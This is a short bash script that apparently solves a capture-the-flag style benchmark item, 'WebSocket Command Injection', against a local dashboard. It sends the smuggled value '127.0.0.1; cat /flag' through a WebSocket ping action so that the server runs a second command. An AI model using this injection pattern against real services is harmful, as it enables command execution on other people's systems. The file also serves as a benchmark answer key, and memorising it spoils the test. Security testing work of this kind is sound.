#!/usr/bin/env bash
# APEX-009-25 — "WebSocket Command Injection" (tags: websocket, command_injection)
#
# A monitoring dashboard takes its instructions over a WebSocket, and the `ping`
# action builds its command by interpolation: `ping -c 1 ${host}`. A host with
# a semicolon in it is therefore two commands, and the second one's output is
# reported back in the same reply as the first's.
#
# This is the benchmark that made h5i grow a verb. The engine has had a
# WebSocket client since it had a browser, and until now the only thing that
# could reach it was page JavaScript — so an application whose commands travel
# over a socket was one this workbench could watch connect and never speak to.
# `websec socket` is `replay` for that protocol: the agent's own frame, through
# the same policy and the same receipts, on a session running no script at all.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex009-$$"
WS="ws://${URL#http://}/monitor"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec socket "$WS" --session "$SESSION" \
    --send '{"action":"ping","host":"127.0.0.1; cat /flag"}' | flag
